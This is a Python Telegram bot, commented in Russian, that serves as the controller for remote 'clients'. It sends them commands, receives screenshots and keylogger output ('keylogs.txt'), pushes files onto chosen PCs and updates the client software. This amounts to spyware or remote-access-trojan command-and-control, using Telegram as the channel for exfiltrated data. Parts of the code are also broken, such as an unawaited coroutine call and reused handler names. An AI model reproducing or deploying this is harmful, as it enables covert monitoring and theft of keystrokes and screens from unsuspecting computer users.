"""
Телеграм интерфейс для управления системкой
"""

import warnings
warnings.filterwarnings("ignore")

import threading
import os
from time import sleep

from server import ManyServers, help_command, Notificator
import config as config
import asyncio

import logging


from aiogram import Bot, Dispatcher, executor, types

API_TOKEN = config.TELEGRAM_TOKEN

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


class TelegramNotificator:
    """Класс для передачи уведомлений из клиента на телеграм"""
    def make_notification(text: str, *args):
        """Отправляет уведомление в телеграме всем, кто добавился через команду /nitification или изначально находится в конфиге сервера"""
        for noti_id in config.NOTI_IDS:
            send_message(noti_id, text)
            send_fut = asyncio.run_coroutine_threadsafe(send_message(noti_id, args[0]), loop)
            send_fut.result()


async def send_message(id, text):
    await bot.send_message(id, text)


@dp.message_handler(commands=['notification'])
async def notification_add(message: types.Message):
    """Добавление/удаление чата в список для уведомлений"""
    # проверка находится ли человек уже в списке, если да, то удаляет его, иначе добаляет
    if message.chat.id not in config.NOTI_IDS:
        # дабавление в список для уведомлений
        config.NOTI_IDS.append(message.chat.id)
        await message.answer("сообщения будут приходить в этот чат")
    else:
        # удаление из спискуа для уведомлений
        config.NOTI_IDS.pop(config.NOTI_IDS.index(message.chat.id))
        await message.answer("сообщения больше не будут приходить в этот чат")

@dp.message_handler(commands=['clients'])
async def view_all_clients(message: types.Message):
    """показывает список доступных подключений"""
    await send_message(config.NOTI_IDS[0], "text")
    await message.answer(mult.view_all_servers())

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    """обработка команды start"""
    await message.answer("Интерфейс для управления системкой")

@dp.message_handler(commands=['help'])
async def help(message: types.Message):
    """обработка команды help"""
    await message.answer(help_command())

@dp.message_handler(commands=['client'])
async def client(message: types.Message):
    """Создание запроса к клиенту"""
    try:
        # обрезает команду /client
        message.text = message.get_args()
        # передает команду менеджеру подключений, который передает ее к конкретному клиенту
        res = await mult.make_command_to_server(message.text)
        # проверяет возврат, если он нулевой, то отправляет сообщение Nothing
        if res is None:
            await message.answer("Nothing")
        # если вернулся не текст, а например файл
        if type(res) != str:
            try:
                if res[0] == "screen":
                    await message.answer_document(open("screen.png", "rb"))
                    os.remove("screen.png")
                elif res[0] == "doc":
                    await message.answer_document(open("keylogs.txt", "rb"))
                    os.remove("keylogs.txt")
            except Exception as err:
                print(err)
            else:
                for i in res[1:]:
                    await message.answer(i)        
        else:
            await message.answer(res)
    except Exception as err:
        print(err)
        await message.reply("ошибка при выполнении команды")

@dp.message_handler(content_types="document")
async def client(message:types.Message):
    """обработка сценария с присланным документом"""
    if message.caption == "":
        await message.reply("необходимо указать тег клиента")
    else:
        # загрузка и сохранение докуманта на сервер для дальнейшей передачи
        name = message.document.file_name
        await message.document.download(destination_file=name)
        if message.caption.split()[0] == "update":
            if len(message.caption.split()) == 1:
                await message.reply("Укажите тег пк, на котором необходимо обновить клиент")
                return
            res = await mult.make_command_to_server(message.caption + "update_client" + name)    
        res = await mult.make_command_to_server(message.caption + " drop " + name)
        os.remove(name)
        await message.answer(res)

@dp.message_handler(commands=['close_server'])
async def client(message: types.Message):
    exit()

mult = ManyServers(notificator=TelegramNotificator())

loop = asyncio.get_event_loop()


def main():
    """main"""
    loop = asyncio.get_event_loop()
    loop.create_server(ManyServers.make_command_to_server)
    loop.create_server(send_message)
    try:
        executor.start_polling(dp, skip_updates=True)
    except Exception as er:
        print(er)
        input()

if __name__ == '__main__':
    main()
